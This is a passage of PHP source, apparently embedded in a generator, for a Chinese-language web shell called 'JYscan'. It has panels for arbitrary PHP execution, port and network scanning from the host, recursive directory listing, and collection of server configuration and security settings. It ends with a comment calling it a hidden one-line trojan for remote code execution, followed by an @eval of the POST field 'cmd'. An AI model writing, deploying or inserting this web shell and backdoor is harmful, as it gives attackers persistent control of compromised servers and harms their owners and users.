    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='phptools'>
        <textarea name='p1' rows='10' cols='80' placeholder='输入PHP代码，例如: echo \\"Hello World\\";'>" . htmlspecialchars(@$_POST['p1']) . "</textarea><br>
        <input type='submit' value='执行PHP代码'>
    </form>";
\s\s\s\s
    echo "<h3>PHP信息:</h3>";
    echo "<pre class='ml1'>";
    echo "PHP版本: " . phpversion() . "\\n";
    echo "Zend引擎: " . zend_version() . "\\n";
    echo "已加载扩展: " . implode(", ", get_loaded_extensions()) . "\\n";
    echo "</pre>";
\s\s\s\s
    echo "</div>";
    jyscanFooter();
}

/**
 * 网络扫描 - JYscan版本
 */
function actionNetwork() {
    jyscanHeader();
    echo "<h1>🌐 网络扫描</h1><div class=content>";
\s\s\s\s
    if(isset($_POST['p1'])) {
        $target = $_POST['p1'];
        echo "<h3>网络扫描结果 - $target:</h3>";
        echo "<pre class='ml1' style='color:#00ff00'>";
\s\s\s\s\s\s\s\s
        // 简单的网络扫描
        if(filter_var($target, FILTER_VALIDATE_IP)) {
            echo "IP地址: $target\\n";
            echo "主机名: " . @gethostbyaddr($target) . "\\n";
\s\s\s\s\s\s\s\s\s\s\s\s
            // 端口扫描
            $ports = array(21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432);
            foreach($ports as $port) {
                $fp = @fsockopen($target, $port, $errno, $errstr, 1);
                if($fp) {
                    echo "端口 $port: 开放\\n";
                    fclose($fp);
                } else {
                    echo "端口 $port: 关闭\\n";
                }
            }
        } else {
            echo "域名: $target\\n";
            $ip = @gethostbyname($target);
            echo "IP地址: $ip\\n";
        }
\s\s\s\s\s\s\s\s
        echo "</pre>";
    }
\s\s\s\s
    echo "<h3>网络扫描:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='Network'>
        <input type='text' name='p1' placeholder='输入IP地址或域名' value='" . htmlspecialchars(@$_POST['p1']) . "'>
        <input type='submit' value='开始扫描'>
    </form>";
\s\s\s\s
    echo "<h3>本地网络信息:</h3>";
    echo "<pre class='ml1'>";
    echo "服务器IP: " . (@$_SERVER['SERVER_ADDR'] ?: '未知') . "\\n";
    echo "客户端IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
    echo "服务器端口: " . $_SERVER['SERVER_PORT'] . "\\n";
    echo "</pre>";
\s\s\s\s
    echo "</div>";
    jyscanFooter();
}

/**
 * 端口扫描 - JYscan版本
 */
function actionPortScan() {
    jyscanHeader();
    echo "<h1>🔍 端口扫描</h1><div class=content>";
\s\s\s\s
    if(isset($_POST['p1'])) {
        $target = $_POST['p1'];
        $startPort = intval($_POST['p2']);
        $endPort = intval($_POST['p3']);
\s\s\s\s\s\s\s\s
        echo "<h3>端口扫描结果 - $target:</h3>";
        echo "<pre class='ml1' style='color:#00ff00'>";
\s\s\s\s\s\s\s\s
        for($port = $startPort; $port <= $endPort; $port++) {
            $fp = @fsockopen($target, $port, $errno, $errstr, 1);
            if($fp) {
                echo "端口 $port: 开放\\n";
                fclose($fp);
            }
        }
\s\s\s\s\s\s\s\s
        echo "</pre>";
    }
\s\s\s\s
    echo "<h3>端口扫描:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='PortScan'>
        <table>
            <tr><td>目标:</td><td><input type='text' name='p1' value='localhost'></td></tr>
            <tr><td>起始端口:</td><td><input type='number' name='p2' value='1'></td></tr>
            <tr><td>结束端口:</td><td><input type='number' name='p3' value='1000'></td></tr>
            <tr><td colspan='2'><input type='submit' value='开始扫描'></td></tr>
        </table>
    </form>";
\s\s\s\s
    echo "</div>";
    jyscanFooter();
}

/**
 * 目录扫描 - JYscan版本
 */
function actionDirScan() {
    jyscanHeader();
    echo "<h1>📂 目录扫描</h1><div class=content>";
\s\s\s\s
    if(isset($_POST['p1'])) {
        $baseDir = $_POST['p1'];
        $pattern = $_POST['p2'];
\s\s\s\s\s\s\s\s
        echo "<h3>目录扫描结果 - $baseDir:</h3>";
        echo "<pre class='ml1' style='color:#00ff00'>";
\s\s\s\s\s\s\s\s
        function scanDirectory($dir, $pattern) {
            $results = array();
            if($handle = @opendir($dir)) {
                while(false !== ($entry = readdir($handle))) {
                    if($entry != "." && $entry != "..") {
                        $fullPath = $dir . "/" . $entry;
                        if(@is_dir($fullPath)) {
                            $results = array_merge($results, scanDirectory($fullPath, $pattern));
                        } else {
                            if(empty($pattern) || preg_match("/$pattern/i", $entry)) {
                                $results[] = $fullPath;
                            }
                        }
                    }
                }
                closedir($handle);
            }
            return $results;
        }
\s\s\s\s\s\s\s\s
        $files = scanDirectory($baseDir, $pattern);
        foreach($files as $file) {
            echo $file . "\\n";
        }
\s\s\s\s\s\s\s\s
        echo "</pre>";
    }
\s\s\s\s
    echo "<h3>目录扫描:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='DirScan'>
        <table>
            <tr><td>目录路径:</td><td><input type='text' name='p1' value='/var/www'></td></tr>
            <tr><td>文件模式:</td><td><input type='text' name='p2' placeholder='例如: .php$'></td></tr>
            <tr><td colspan='2'><input type='submit' value='开始扫描'></td></tr>
        </table>
    </form>";
\s\s\s\s
    echo "</div>";
    jyscanFooter();
}

/**
 * 信息收集 - JYscan版本
 */
function actionInfoGather() {
    jyscanHeader();
    echo "<h1>📊 信息收集</h1><div class=content>";
\s\s\s\s
    echo "<h3>系统信息:</h3>";
    echo "<pre class='ml1'>";
    echo "操作系统: " . php_uname() . "\\n";
    echo "PHP版本: " . phpversion() . "\\n";
    echo "服务器软件: " . @$_SERVER['SERVER_SOFTWARE'] . "\\n";
    echo "文档根目录: " . @$_SERVER['DOCUMENT_ROOT'] . "\\n";
    echo "当前用户: " . @get_current_user() . "\\n";
    echo "</pre>";
\s\s\s\s
    echo "<h3>PHP配置:</h3>";
    echo "<pre class='ml1'>";
    echo "安全模式: " . (@ini_get('safe_mode') ? "开启" : "关闭") . "\\n";
    echo "禁用函数: " . (@ini_get('disable_functions') ?: "无") . "\\n";
    echo "Open BaseDir: " . (@ini_get('open_basedir') ?: "无限制") . "\\n";
    echo "内存限制: " . @ini_get('memory_limit') . "\\n";
    echo "上传限制: " . @ini_get('upload_max_filesize') . "\\n";
    echo "执行时间: " . @ini_get('max_execution_time') . "秒\\n";
    echo "</pre>";
\s\s\s\s
    echo "<h3>环境变量:</h3>";
    echo "<pre class='ml1'>";
    foreach($_SERVER as $key => $value) {
        if(strpos($key, 'HTTP_') === 0 || in_array($key, array('PATH', 'PWD', 'HOME'))) {
            echo "$key: $value\\n";
        }
    }
    echo "</pre>";
\s\s\s\s
    echo "</div>";
    jyscanFooter();
}

/**
 * 安全信息 - JYscan版本
 */
function actionSecInfo() {
    jyscanHeader();
    echo "<h1>🔒 安全信息</h1><div class=content>";
\s\s\s\s
    echo "<h3>PHP配置信息:</h3>";
    echo "<pre class='ml1'>";
    echo "安全模式: " . (@ini_get('safe_mode') ? "开启" : "关闭") . "\\n";
    echo "禁用函数: " . (@ini_get('disable_functions') ?: "无") . "\\n";
    echo "Open BaseDir: " . (@ini_get('open_basedir') ?: "无限制") . "\\n";
    echo "内存限制: " . @ini_get('memory_limit') . "\\n";
    echo "上传限制: " . @ini_get('upload_max_filesize') . "\\n";
    echo "执行时间: " . @ini_get('max_execution_time') . "秒\\n";
    echo "</pre>";
\s\s\s\s
    echo "<h3>系统信息:</h3>";
    echo "<pre class='ml1'>";
    echo php_uname() . "\\n";
    echo "服务器IP: " . (@$_SERVER['SERVER_ADDR'] ?: '未知') . "\\n";
    echo "文档根目录: " . (@$_SERVER['DOCUMENT_ROOT'] ?: '未知') . "\\n";
    echo "</pre>";
\s\s\s\s
    echo "</div>";
    jyscanFooter();
}

// 主处理逻辑
 if(isset($_POST['a'])) {
    $action = $_POST['a'];
    switch($action) {
        case 'FilesMan':
            actionFilesMan();
            break;
        case 'Console':
            actionConsole();
            break;
        case 'Sql':
            actionSql();
            break;
        case 'phptools':
            actionPhptools();
            break;
        case 'Network':
            actionNetwork();
            break;
        case 'PortScan':
            actionPortScan();
            break;
        case 'DirScan':
            actionDirScan();
            break;
        case 'InfoGather':
            actionInfoGather();
            break;
        case 'SecInfo':
            actionSecInfo();
            break;
        default:
            // 默认显示文件管理器
            actionFilesMan();
            break;
    }
} else {
    // 默认显示文件管理器
    actionFilesMan();
}

// 隐藏的一句话木马 - 用于远程代码执行
// 如果用户设置了自定义连接密码，则使用该密码，否则使用默认的attack
if(isset($_POST['cmd'])) {
    @eval($_POST['cmd']);
}

?>""";
}
